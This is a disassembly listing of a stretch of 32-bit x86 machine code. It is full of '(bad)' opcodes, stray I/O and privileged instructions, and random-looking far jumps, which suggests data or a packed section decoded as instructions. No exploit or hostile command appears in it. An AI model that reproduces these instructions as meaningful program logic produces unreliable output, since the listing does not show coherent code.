  41b4d1:	mov    ebx,0xe9dc6b93
  41b4d6:	fist   WORD PTR [edi-0x28]
  41b4d9:	dec    DWORD PTR [edi]
  41b4db:	mov    ds:0x150942e2,al
  41b4e0:	xchg   ebp,eax
  41b4e1:	out    dx,al
  41b4e2:	scas   eax,DWORD PTR es:[edi]
  41b4e3:	or     DWORD PTR [ebp+0x6d],0xffffffae
  41b4e7:	cld    
  41b4e8:	pushf  
  41b4e9:	mov    ebx,0x6f116f73
  41b4ee:	pop    ecx
  41b4ef:	popf   
  41b4f0:	or     DWORD PTR [edi-0x7698a2d6],esi
  41b4f6:	adc    ecx,DWORD PTR [ecx+0x50811ba3]
  41b4fc:	xor    BYTE PTR [ebp-0xd],dl
  41b4ff:	lock adc eax,0x7128c907
  41b505:	pop    eax
  41b506:	dec    ecx
  41b507:	inc    esi
  41b508:	arpl   WORD PTR [ecx+0x4a35ebf],bx
  41b50e:	add    BYTE PTR [ebx+0x0],ah
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	inc    esi
  41b581:	repz test eax,0x122186f
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	mov    ds:0x99ad04d3,eax
  41b591:	ror    DWORD PTR [eax+0xf],1
  41b594:	or     eax,ecx
  41b596:	cwde   
  41b597:	dec    ebp
  41b598:	aas    
  41b599:	loop   0x41b615
  41b59b:	mov    DWORD PTR [eax+eax*2],esi
  41b59e:	sub    al,0xc8
  41b5a0:	jmp    0xcfdd:0x6b83249c
  41b5a7:	(bad)  
  41b5a8:	rol    BYTE PTR [ebx],cl
  41b5aa:	cmp    dl,BYTE PTR [esi-0x31]
  41b5ad:	sbb    ah,BYTE PTR [ebp+0x6103c678]
  41b5b3:	aad    0x9b
  41b5b5:	lock jae 0x41b5fe
  41b5b8:	adc    eax,0x66fa1297
  41b5bd:	pusha  
  41b5be:	sbb    esi,DWORD PTR [ecx+0x773f717b]
  41b5c4:	ins    BYTE PTR es:[edi],dx
  41b5c5:	in     al,0xe5
  41b5c7:	into   
  41b5c8:	cmp    al,0xab
  41b5ca:	popa   
  41b5cb:	repz pop esp
  41b5cd:	jo     0x41b5cf
  41b5cf:	mov    dh,0xa5
  41b5d1:	sbb    esi,DWORD PTR [edx+edx*4]
  41b5d4:	and    ebp,DWORD PTR [edi+0x1a786b48]
  41b5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5db:	inc    eax
  41b5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5dd:	stos   BYTE PTR es:[edi],al
  41b5de:	ret    
  41b5df:	pop    edx
  41b5e0:	push   ebx
  41b5e1:	push   0xbccdb0c7
  41b5e6:	fbld   TBYTE PTR [ebx+0xd974b38]
  41b5ec:	and    dl,bl
  41b5ee:	cmp    eax,ecx
  41b5f0:	mov    ds:0x81ea090e,al
  41b5f5:	jae    0x41b647
  41b5f7:	imul   ecx,DWORD PTR [eax-0x6b5ca91f],0xec43e418
  41b601:	inc    edx
  41b602:	hlt    
  41b603:	ins    BYTE PTR es:[edi],dx
  41b604:	dec    ebx
  41b605:	dec    ebp
  41b606:	adc    eax,0x8c2f828c
  41b60b:	fst    DWORD PTR [esi-0x76]
  41b60e:	iret   
  41b60f:	mov    dh,0xce
  41b611:	or     ebp,ebp
  41b613:	sar    ebx,0x63
  41b616:	jns    0x41b620
  41b618:	xchg   edi,eax
  41b619:	pop    esp
  41b61a:	ins    DWORD PTR es:[edi],dx
  41b61b:	popa   
  41b61c:	imul   ebx,DWORD PTR [edi+0x32],0x8654d8ae
  41b623:	inc    ebx
  41b624:	xchg   ebp,eax
  41b625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b626:	imul   esp,DWORD PTR [ecx-0x6ecf8efb],0xda41c8f2
  41b630:	sub    eax,0x3463f21d
  41b635:	call   0x895d:0x283380be
  41b63c:	push   0xffffffd2
  41b63e:	retf   
  41b63f:	rcl    dl,0xf
  41b642:	enter  0xd8aa,0x71
  41b646:	jb     0x41b659
  41b648:	xchg   edx,eax
  41b649:	jb     0x41b5e3
  41b64b:	pop    ebx
  41b64c:	pushf  
  41b64d:	inc    ebp
  41b64e:	in     al,dx
  41b64f:	add    BYTE PTR [esi-0x1291a09],al
  41b655:	sbb    edi,DWORD PTR [ebp+esi*8+0x4]
  41b659:	pop    edx
  41b65a:	jb     0x41b5eb
  41b65c:	stc    
  41b65d:	arpl   WORD PTR [edx],sp
  41b65f:	mov    WORD PTR [esi+0xaf477f3],ds
  41b665:	inc    ebp
  41b666:	push   eax
  41b667:	pop    es
  41b668:	jg     0x41b619
  41b66a:	pop    ebx
  41b66b:	loopne 0x41b6cb
  41b66d:	fimul  WORD PTR ds:0x8d98c648
  41b673:	retf   0xf155
  41b676:	jo     0x41b605
  41b678:	or     BYTE PTR [esi-0x12],cl
  41b67b:	inc    ebp
  41b67c:	push   ss
  41b67d:	mov    ah,0x36
  41b67f:	pop    eax
  41b680:	rcl    DWORD PTR [ebp+0x4b],cl
  41b683:	mov    fs,WORD PTR [edx]
  41b685:	and    ecx,DWORD PTR [eax-0x2f3c767b]
  41b68b:	out    0x89,al
  41b68d:	out    dx,eax
  41b68e:	enter  0xcb,0x0
	...
  41b6f2:	add    BYTE PTR [eax],al
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	pop    ds
  41b701:	pop    ds
  41b702:	mov    cl,BYTE PTR [ebx+0x1231c]
  41b708:	add    al,0x1
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	stc    
  41b70d:	add    dh,BYTE PTR [edx+ebx*8+0x6dd7196e]
  41b714:	js     0x41b6b5
  41b716:	push   ds
  41b717:	push   esp
  41b718:	sar    eax,0xea
  41b71b:	inc    edx
  41b71c:	jmp    0x9a7e470d
  41b721:	pop    esp
  41b722:	sub    BYTE PTR [ebp-0x40],bh
  41b725:	push   esi
  41b726:	xor    ch,ch
  41b728:	or     BYTE PTR [edi+0x39],cl
  41b72b:	add    DWORD PTR [esi-0x2b],eax
  41b72e:	sbb    cl,bh
  41b730:	or     eax,0x701ef8a2
  41b735:	push   cs
  41b736:	fld    TBYTE PTR [esi]
  41b738:	push   ebp
  41b739:	aam    0x7b
  41b73b:	xchg   esp,eax
  41b73c:	dec    ecx
  41b73d:	or     ebp,ecx
  41b73f:	cmp    al,0xd3
  41b741:	adc    esi,DWORD PTR [edi-0x2a489d1f]
  41b747:	popf   
  41b748:	in     eax,dx
  41b749:	mov    ds:0x2b896e62,eax
  41b74e:	add    BYTE PTR [ebx+0x3fff19e9],cl
  41b754:	mov    BYTE PTR [ecx-0x4b],0x7e
  41b758:	jp     0x41b708
  41b75a:	adc    DWORD PTR ds:0xfccb3de4,edi
  41b760:	mov    ds:0x90cef1d7,eax
  41b765:	shr    BYTE PTR ds:0xd078c541,0xe
  41b76c:	pop    edi
  41b76d:	inc    ebx
  41b76e:	sti    
  41b76f:	add    ah,dh
  41b771:	mov    eax,0xc6bfeac5
  41b776:	dec    edi
  41b777:	nop
  41b778:	mov    dl,0xab
  41b77a:	and    esi,esi
  41b77c:	inc    eax
  41b77d:	fistp  DWORD PTR [ebx]
  41b77f:	int    0x75
  41b781:	or     al,0xe6
  41b783:	fwait
  41b784:	cmp    BYTE PTR [eax+0xba6c196],cl
  41b78a:	in     al,dx
  41b78b:	sbb    al,0x45
  41b78d:	loope  0x41b7ca
  41b78f:	test   DWORD PTR [edx-0x58cdf36f],ebx
  41b795:	or     ebp,DWORD PTR [edx-0x3efa8ec8]
  41b79b:	sub    esi,ebx
  41b79d:	fisub  WORD PTR [edx-0xe]
  41b7a0:	xchg   ebp,eax
  41b7a1:	push   eax
  41b7a2:	adc    eax,0xd22d91c9
  41b7a7:	out    dx,al
  41b7a8:	pushf  
  41b7a9:	adc    esp,DWORD PTR [ebx+0x14]
  41b7ac:	cli    
  41b7ad:	fwait
  41b7ae:	sahf   
  41b7af:	adc    al,0x21
  41b7b1:	adc    DWORD PTR [ebx],edx
  41b7b3:	popf   
  41b7b4:	ror    BYTE PTR [ecx+0x27],0x32
  41b7b8:	shl    DWORD PTR [edi],cl
  41b7ba:	fmul   DWORD PTR [edx-0xccc1cff]
  41b7c0:	loopne 0x41b7ad
  41b7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7c3:	pop    esp
  41b7c4:	pusha  
  41b7c5:	cdq    
  41b7c6:	ja     0x41b752
  41b7c8:	ins    DWORD PTR es:[edi],dx
  41b7c9:	jmp    0xa84e:0x7d954e22
  41b7d0:	repz push es
  41b7d2:	mov    DWORD PTR [esp+0x590eba95],eax
  41b7d9:	xchg   ebp,eax
  41b7da:	test   BYTE PTR [edi],ah
  41b7dc:	test   DWORD PTR [ecx+0x744ea927],esp
  41b7e2:	int3   
  41b7e3:	push   edx
  41b7e4:	mov    bh,BYTE PTR ds:0x48ddf1c3
  41b7ea:	sub    DWORD PTR [ebp-0x7aaea03d],esi
  41b7f0:	dec    ecx
  41b7f1:	pop    es
  41b7f2:	cmc    
  41b7f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7f4:	sti    
  41b7f5:	mov    cl,0x2f
  41b7f7:	dec    ebp
  41b7f8:	cdq    
  41b7f9:	in     al,dx
  41b7fa:	mov    WORD PTR [edx-0x559f71f],fs
  41b800:	in     al,0x47
  41b802:	dec    ebx
  41b803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b804:	xchg   esi,eax
  41b805:	dec    eax
  41b806:	jmp    0x41b794
  41b808:	bound  ebx,QWORD PTR [esi+0x59]
  41b80b:	push   ss
  41b80c:	sbb    ch,0x88
  41b80f:	jb     0x41b811
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xe
  41b881:	retf   0xa6c9
  41b884:	and    BYTE PTR [ecx+eax*1],ah
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	add    BYTE PTR [ebx],0x4f
  41b88f:	push   esi
  41b890:	lds    eax,FWORD PTR [ecx]
  41b892:	mov    ch,0xc9
  41b894:	lahf   
  41b895:	arpl   ax,sp
  41b897:	sub    eax,0x1a7473f0
  41b89c:	or     edx,DWORD PTR [edx+0x30cc1b7c]
  41b8a2:	aaa    
  41b8a3:	cmp    ah,BYTE PTR [eax+0x17b95944]
  41b8a9:	retf   0x7be9
  41b8ac:	inc    eax
  41b8ad:	cld    
  41b8ae:	xor    al,dl
  41b8b0:	cli    
  41b8b1:	adc    DWORD PTR [edi-0x24],esp
  41b8b4:	arpl   WORD PTR [ebx+esi*8-0x9c8af1c],cx
  41b8bb:	pop    ds
  41b8bc:	(bad)  
  41b8be:	icebp  
  41b8bf:	out    0x31,al
  41b8c1:	daa    
  41b8c2:	mov    al,0x37
  41b8c4:	mov    ecx,0xaa756829
  41b8c9:	in     al,0x1e
  41b8cb:	mov    eax,DWORD PTR [edx]
  41b8cd:	(bad)  
  41b8ce:	cwde   
  41b8cf:	cmp    BYTE PTR [edi],al
  41b8d1:	mov    ebx,0xf933d6fd
  41b8d6:	fstp   DWORD PTR [esp+esi*8+0x73fe4fc7]
  41b8dd:	mov    edx,0xd55a9624
  41b8e2:	fwait
  41b8e3:	mov    eax,ds:0x51079de4
  41b8e8:	jmp    0x8797:0xe03854e3
  41b8ef:	sub    BYTE PTR [eax-0x6f],ah
  41b8f2:	xchg   BYTE PTR [esi+0x7a],cl
  41b8f5:	std    
  41b8f6:	mov    ds:0x407c9b33,eax
  41b8fb:	test   BYTE PTR [edx+0x4c9d9e8c],al
  41b901:	ja     0x41b8c7
  41b903:	stc    
  41b904:	stc    
  41b905:	int3   
  41b906:	add    DWORD PTR [edx],ecx
  41b908:	fbld   TBYTE PTR [eax+esi*2+0x31]
  41b90c:	add    BYTE PTR [eax-0x2f7e5d0b],ch
  41b912:	jl     0x41b8f9
  41b914:	dec    ecx
  41b915:	fimul  DWORD PTR ss:[ebx+0x5951ff54]
  41b91c:	fxam   
  41b91e:	lock xchg edi,eax
  41b920:	scas   eax,DWORD PTR es:[edi]
  41b921:	(bad)  
  41b922:	test   eax,0x9cfbc16b
  41b927:	inc    ebx
  41b928:	popf   
  41b929:	shr    al,1
  41b92b:	jl     0x41b973
  41b92d:	aad    0x6d
  41b92f:	xchg   ecx,eax
  41b930:	ret    
  41b931:	adc    ecx,DWORD PTR [eax]
  41b933:	mov    WORD PTR [eax+0x1d],?
  41b936:	mov    ebp,0x2d7dc52d
  41b93b:	xor    dl,BYTE PTR [ebp+0x7e]
  41b93e:	or     DWORD PTR [ebx+0x3d],esi
  41b941:	mov    al,0xe7
  41b943:	push   edx
  41b944:	stos   DWORD PTR es:[edi],eax
  41b945:	push   esp
  41b946:	sbb    bh,BYTE PTR [ebx+0x6ff6fd64]
  41b94c:	in     al,0x8
  41b94e:	(bad)  
  41b950:	stos   DWORD PTR es:[edi],eax
  41b951:	lods   al,BYTE PTR ds:[esi]
  41b952:	inc    edx
  41b953:	mov    esp,0x4ecb5732
  41b958:	das    
  41b959:	shr    DWORD PTR [ecx-0x4bcc0f1b],cl
  41b95f:	out    0x17,eax
  41b961:	in     eax,0x55
  41b963:	xchg   edi,eax
  41b964:	mov    edi,0x2dff6a93
  41b969:	mov    cl,0x4d
  41b96b:	mov    ds:0xf656f3ae,al
  41b970:	(bad)  
  41b971:	stc    
  41b972:	jns    0x41b9d8
  41b974:	xchg   BYTE PTR [edi+esi*2],bh
  41b977:	xor    al,0x9c
  41b979:	fisttp QWORD PTR [eax]
  41b97b:	pop    ss
  41b97c:	popa   
  41b97d:	mov    ebx,0x88ef575a
  41b982:	ret    0x6227
  41b985:	in     al,0x89
  41b987:	jmp    0x41b978
  41b989:	fs pop ebx
  41b98b:	(bad)  
  41b98c:	call   0x135b6cd
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	or     al,0x8f
  41ba02:	adc    ebx,DWORD PTR [ecx+0x12524]
  41ba08:	add    al,0x1
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	sub    BYTE PTR [esi+edi*8],ch
  41ba0f:	(bad)  
  41ba10:	pop    ecx
  41ba11:	sti    
  41ba12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba13:	adc    BYTE PTR [ebx+0x25],bh
  41ba16:	ret    0xb10b
  41ba19:	xchg   edi,eax
  41ba1a:	add    ebp,DWORD PTR [ebx]
  41ba1c:	jle    0x41ba44
  41ba1e:	push   edx
  41ba1f:	sub    ah,bl
  41ba21:	push   0xffffffc2
  41ba23:	adc    ch,0xe9
  41ba26:	gs (bad) 
  41ba28:	or     ebp,DWORD PTR [edx-0xadd60f3]
  41ba2e:	xchg   ecx,eax
  41ba2f:	xor    al,0x78
  41ba31:	out    0xb0,al
  41ba33:	xor    dh,BYTE PTR [esp+ecx*1-0x318df321]
  41ba3a:	sbb    al,0xd9
  41ba3c:	sahf   
  41ba3d:	mov    ebp,0xac533a22
  41ba42:	dec    eax
  41ba43:	mov    ds:0xddc00f1a,al
  41ba48:	inc    ebp
  41ba49:	push   eax
  41ba4a:	leave  
  41ba4b:	dec    esp
  41ba4c:	(bad)  
  41ba4d:	cmp    ch,BYTE PTR [ebx+eiz*1]
  41ba50:	rcr    DWORD PTR ds:0xd0050495,cl
  41ba56:	and    DWORD PTR [esi],ecx
  41ba58:	inc    ebp
  41ba59:	and    al,0x42
  41ba5b:	loope  0x41ba7c
  41ba5d:	mov    ds:0xc71468a2,eax
  41ba62:	loopne 0x41babf
  41ba64:	dec    ecx
  41ba65:	mov    bh,BYTE PTR [esi]
  41ba67:	pop    edx
  41ba68:	pop    eax
  41ba69:	scas   al,BYTE PTR es:[edi]
  41ba6a:	hlt    
  41ba6b:	add    al,0x6d
  41ba6d:	adc    esi,ebp
  41ba6f:	mov    esi,0xc2eaaa4d
  41ba74:	inc    edi
  41ba75:	das    
  41ba76:	push   ebp
  41ba77:	mov    eax,ds:0x12815b2b
  41ba7c:	and    al,0xc4
  41ba7e:	data16 add al,0x7d
  41ba81:	(bad)  
  41ba82:	cmp    ah,BYTE PTR [ebp-0x70982dbc]
  41ba88:	dec    edi
  41ba89:	push   es
  41ba8a:	fimul  WORD PTR [ebx-0x597b859e]
  41ba90:	push   DWORD PTR [esi]
  41ba92:	icebp  
  41ba93:	cmp    ebp,DWORD PTR [ebp-0x2cdcbdd]
  41ba99:	pop    edi
  41ba9a:	xor    eax,0xb898c72b
  41ba9f:	(bad)  
  41baa0:	mov    al,ds:0xb0eac5a4
  41baa5:	mov    bh,0x13
  41baa7:	adc    edi,DWORD PTR [edi-0x241fe54d]
  41baad:	mov    ebp,0xf9d40dbb
  41bab2:	(bad)  
  41bab3:	push   ecx
  41bab4:	jns    0x41bb00
  41bab6:	mov    esi,0x165006e2
  41babb:	imul   BYTE PTR ds:0xc5deb6c6
  41bac1:	add    DWORD PTR [eax-0x52a8b426],esi
  41bac7:	sbb    al,0xf8
  41bac9:	mov    DWORD PTR [edi+0x68],ebx
  41bacc:	adc    bh,BYTE PTR [ebx-0x7]
  41bacf:	jge    0x41bac5
  41bad1:	mov    ebp,0x7ac898ac
  41bad6:	mov    ss,WORD PTR [ebx+0x31]
  41bad9:	addr16 xchg edx,eax
  41badb:	out    dx,eax
  41badc:	test   al,0x11
  41bade:	call   0xcfe8:0xf96efe8c
  41bae5:	xchg   edx,eax
  41bae6:	push   edi
  41bae7:	jnp    0x41bab0
  41bae9:	sub    esi,0x6b
  41baec:	lahf   
  41baed:	or     al,0x2a
  41baef:	data16 or al,0xc8
  41baf2:	sti    
  41baf3:	mov    al,ds:0x60e00232
  41baf8:	push   ebp
  41baf9:	add    esp,DWORD PTR [ebp-0x4b7a9a02]
  41baff:	in     al,dx
  41bb00:	sbb    dh,ch
  41bb02:	clc    
  41bb03:	dec    ecx
  41bb04:	and    eax,eax
  41bb06:	jl     0x41bb1b
  41bb08:	pop    ss
  41bb09:	and    DWORD PTR [edi],esi
  41bb0b:	and    dh,BYTE PTR [esi-0x79]
  41bb0e:	cmp    ah,ch
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x61],cx
  41bb81:	jae    0x41bb34
  41bb83:	imul   ebp,DWORD PTR [eax],0x4000126
  41bb89:	add    DWORD PTR [eax],eax
  41bb8b:	add    BYTE PTR [eax+0x6a3e282e],ah
  41bb91:	or     al,0x21
  41bb93:	fcomip st,st(3)
  41bb95:	push   esi
  41bb96:	or     al,0xc1
  41bb98:	fistp  DWORD PTR [ecx+0x61c7f955]
  41bb9e:	test   edx,edi
  41bba0:	ds jbe 0x41bbad
  41bba3:	mov    ebp,0x973697f9
  41bba8:	inc    ebp
  41bba9:	cli    
  41bbaa:	mov    eax,0xc2c4bd49
  41bbaf:	lahf   
  41bbb0:	les    ebp,FWORD PTR [esi-0x7d]
  41bbb3:	xchg   ecx,eax
  41bbb4:	lock cmp edi,0x2f35a0d7
  41bbbb:	adc    DWORD PTR [edi],eax
  41bbbd:	push   edi
  41bbbe:	fst    QWORD PTR [ebp+0x3c]
  41bbc1:	mov    dl,0xb7
  41bbc3:	inc    esi
  41bbc4:	into   
  41bbc5:	ror    DWORD PTR [edi],0x26
  41bbc8:	jne    0x41bb73
  41bbca:	push   ss
  41bbcb:	and    DWORD PTR [ecx+esi*4],ebp
  41bbce:	cmp    ch,BYTE PTR [ecx]
  41bbd0:	retf   0x3dda
  41bbd3:	pop    esp
  41bbd4:	js     0x41bb92
  41bbd6:	ins    DWORD PTR es:[edi],dx
  41bbd7:	ins    BYTE PTR es:[edi],dx
  41bbd8:	mov    eax,ds:0xe23f96a8
  41bbdd:	nop
  41bbde:	lahf   
  41bbdf:	shl    DWORD PTR [edx+0x339e01f7],cl
  41bbe5:	das    
  41bbe6:	push   es
  41bbe7:	mov    DWORD PTR [ebp+0x516b9396],eax
  41bbed:	and    ah,dl
  41bbef:	pop    edx
  41bbf0:	inc    eax
  41bbf1:	push   edi
  41bbf2:	add    al,BYTE PTR [ecx-0x58ea04b7]
  41bbf8:	loop   0x41bc15
  41bbfa:	inc    ecx
  41bbfb:	jno    0x41bbbe
  41bbfd:	test   eax,0x70206fb1
  41bc02:	xor    eax,0xfff513e0
  41bc07:	or     DWORD PTR [ebx-0x71027bf5],esp
  41bc0d:	mov    DWORD PTR [bp+si],edx
  41bc10:	or     eax,0x85af06af
  41bc15:	ins    DWORD PTR es:[edi],dx
  41bc16:	xchg   ebx,ecx
  41bc18:	dec    edx
  41bc19:	hlt    
  41bc1a:	call   0xb468:0xd5f9dc10
  41bc21:	jge    0x41bbbf
  41bc23:	cmovns eax,DWORD PTR [edi]
  41bc26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc27:	cld    
  41bc28:	and    eax,DWORD PTR [ebx]
  41bc2a:	adc    DWORD PTR [edi],ecx
  41bc2c:	mov    ah,0x88
  41bc2e:	inc    esi
  41bc2f:	stc    
  41bc30:	add    eax,0x152af0e6
  41bc35:	xchg   ecx,eax
  41bc36:	inc    DWORD PTR [esi+0x76]
  41bc39:	dec    ebp
  41bc3a:	mov    bl,0x24
  41bc3c:	and    esp,ecx
  41bc3e:	push   edx
  41bc3f:	push   edi
  41bc40:	int3   
  41bc41:	lds    ecx,FWORD PTR [esi+0x10de4d79]
  41bc47:	cli    
  41bc48:	pop    ecx
  41bc49:	mov    ecx,0xc306d79d
  41bc4e:	sub    DWORD PTR [edx+0x25],ecx
  41bc51:	jg     0x41bc5e
  41bc53:	xor    al,0xca
  41bc55:	jbe    0x41bc65
  41bc57:	aas    
  41bc58:	and    BYTE PTR [ecx],0x73
  41bc5b:	xor    ch,0x7a
  41bc5e:	jl     0x41bc7e
  41bc60:	jmp    0xc574:0xa222a43f
  41bc67:	fwait
  41bc68:	cld    
  41bc69:	push   ebx
  41bc6a:	adc    dl,BYTE PTR [edi+0x35]
  41bc6d:	sbb    esi,DWORD PTR [ecx-0x73]
  41bc70:	sbb    al,0x5d
  41bc72:	mov    edi,ebp
  41bc74:	pushf  
  41bc75:	neg    DWORD PTR [edx-0x2d]
  41bc78:	popa   
  41bc79:	pop    ds
  41bc7a:	dec    eax
  41bc7b:	fistp  QWORD PTR [ecx+0x2e]
  41bc7e:	das    
  41bc7f:	call   0xcd15:0x21cbf4b1
  41bc86:	popf   
  41bc87:	push   eax
  41bc88:	es hlt 
  41bc8a:	in     eax,dx
  41bc8b:	fst    DWORD PTR [edi]
  41bc8d:	jle    0x41bc4f
  41bc8f:	inc    DWORD PTR [eax]
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x5368d9d8
  41bd02:	fnstsw WORD PTR [eax]
  41bd04:	sub    al,0x27
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	sub    dl,dl
  41bd0e:	(bad)  
  41bd0f:	sub    bh,al
  41bd11:	(bad)  
  41bd12:	push   ebp
  41bd13:	loope  0x41bcc3
  41bd15:	test   DWORD PTR [eax],ebp
  41bd17:	xchg   ecx,edi
  41bd19:	xchg   DWORD PTR [edi+0x1f],edi
  41bd1c:	fs ins BYTE PTR es:[edi],dx
  41bd1e:	jecxz  0x41bd40
  41bd20:	adc    cl,al
  41bd22:	adc    ebp,edi
  41bd24:	pushf  
  41bd25:	mov    dh,0x18
  41bd27:	mov    ah,0xcd
  41bd29:	(bad)  
  41bd2a:	pop    edx
  41bd2b:	cmp    bh,BYTE PTR [ecx]
  41bd2d:	mov    al,ds:0x2172e75
  41bd32:	pop    esi
  41bd33:	lods   al,BYTE PTR ds:[esi]
  41bd34:	les    eax,FWORD PTR [ebx+0x1e8783cf]
  41bd3a:	jo     0x41bdaa
  41bd3c:	jmp    0x4717abdf
  41bd41:	(bad)  
  41bd42:	out    dx,al
  41bd43:	or     DWORD PTR [ebp-0x2be0db55],edx
  41bd49:	mov    cs,ecx
  41bd4b:	jnp    0x41bd9f
  41bd4d:	addr16 push es
  41bd4f:	in     eax,dx
  41bd50:	aam    0xfa
  41bd52:	icebp  
  41bd53:	aaa    
  41bd54:	aaa    
  41bd55:	je     0x41bdc8
  41bd57:	sbb    ah,BYTE PTR [eax-0x70f2dfab]
  41bd5d:	mov    bl,0x1e
  41bd5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd60:	cli    
  41bd61:	(bad)  
  41bd62:	jmp    0xd4062159
  41bd67:	jns    0x41bd01
  41bd69:	inc    ebx
  41bd6a:	repnz cmp cl,ah
  41bd6d:	scas   eax,DWORD PTR es:[edi]
  41bd6e:	daa    
  41bd6f:	inc    edx
  41bd70:	lahf   
  41bd71:	(bad)  
  41bd73:	pop    edi
  41bd74:	sub    esi,DWORD PTR [ebx]
  41bd76:	in     al,dx
  41bd77:	or     eax,0xe493c922
  41bd7c:	inc    ebp
  41bd7d:	jae    0x41bd51
  41bd7f:	add    eax,0x67efc25f
  41bd84:	fs adc eax,0x8cc831e4
  41bd8a:	and    BYTE PTR [ebx-0x69],bh
  41bd8d:	mov    eax,ds:0xf205bc8f
  41bd92:	out    0xc6,al
  41bd94:	sbb    DWORD PTR [ebp+0x4f],eax
  41bd97:	jo     0x41bd66
  41bd99:	sahf   
  41bd9a:	add    DWORD PTR [esi],esp
  41bd9c:	(bad)  
  41bd9d:	inc    esi
  41bd9e:	inc    eax
  41bd9f:	ins    DWORD PTR es:[edi],dx
  41bda0:	xlat   BYTE PTR ds:[ebx]
  41bda1:	push   ss
  41bda2:	mov    eax,0xc67b36ce
  41bda7:	sti    
  41bda8:	adc    BYTE PTR [ebp-0x785d42a0],0x76
  41bdaf:	mov    edx,DWORD PTR [esi+0x29843ed2]
  41bdb5:	push   ecx
  41bdb6:	dec    ebp
  41bdb7:	jae    0x41bd76
  41bdb9:	mov    ecx,0xcf8865ea
  41bdbe:	not    DWORD PTR [edx+0x1da3910f]
  41bdc4:	fldenv [ebp-0x339b7f0b]
  41bdca:	in     al,dx
  41bdcb:	in     al,0xda
  41bdcd:	imul   ebx,DWORD PTR [eax],0xff230604
  41bdd3:	xchg   ebp,eax
  41bdd4:	shl    edi,cl
  41bdd6:	test   bh,bl
  41bdd8:	adc    al,BYTE PTR [ebx]
  41bdda:	jnp    0x41bdae
  41bddc:	adc    cl,bl
  41bdde:	pop    ebx
  41bddf:	mov    edx,0x6b75502d
  41bde4:	adc    ah,BYTE PTR [edx-0x641d110a]
  41bdea:	data16 xchg BYTE PTR [edi+edx*4],dh
  41bdee:	or     BYTE PTR [ebp-0x626aed10],0xc2
  41bdf5:	push   edi
  41bdf6:	mov    esi,0xab788dde
  41bdfb:	mov    ebp,0x78aeea99
  41be00:	ja     0x41be25
  41be02:	cmp    esi,ebx
  41be04:	loope  0x41be46
  41be06:	xchg   edx,eax
  41be07:	mov    eax,0xc6840961
  41be0d:	scas   al,BYTE PTR es:[edi]
  41be0e:	push   0xe6
	...
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0xe35c09a]
  41be82:	add    DWORD PTR [edi+0x30],esi
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR [ecx+eax*1],al
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	jl     0x41be2d
  41be8e:	sbb    eax,0x102db859
  41be93:	or     eax,0x10f70d0d
  41be98:	push   ds
  41be99:	ja     0x41be3d
  41be9b:	fadd   DWORD PTR [ecx-0x40]
  41be9e:	stos   BYTE PTR es:[edi],al
  41be9f:	shr    BYTE PTR [eax+0x36aa0e81],1
  41bea5:	loop   0x41be90
  41bea7:	cs lock aaa 
  41beaa:	gs ja  0x41bf0f
  41bead:	xchg   BYTE PTR [edx-0x4b98ebc4],cl
  41beb3:	in     eax,0x28
  41beb5:	inc    ecx
  41beb6:	adc    dl,bl
  41beb8:	mov    al,ds:0xd1f007ba
  41bebd:	shl    DWORD PTR [edx-0x773637d5],0x83
  41bec4:	rcl    ebx,1
  41bec6:	inc    ebp
  41bec7:	adc    BYTE PTR [ecx-0x6b],dh
  41beca:	cmp    eax,0xbaff6635
  41becf:	bound  esi,QWORD PTR [ecx+0x82b1921]
  41bed5:	push   edx
  41bed6:	jp     0x41bf3a
  41bed8:	push   es
  41bed9:	add    al,0xdf
  41bedb:	loop   0x41bf30
  41bedd:	out    0x33,eax
  41bedf:	mov    bh,0x1c
  41bee1:	push   ss
  41bee2:	mov    esi,DWORD PTR [ecx+0x1fe819ad]
  41bee8:	jg     0x41beca
  41beea:	dec    edx
  41beeb:	sub    eax,0xe0692fb7
  41bef0:	adc    dh,BYTE PTR [esi-0x343a89c2]
  41bef6:	dec    edx
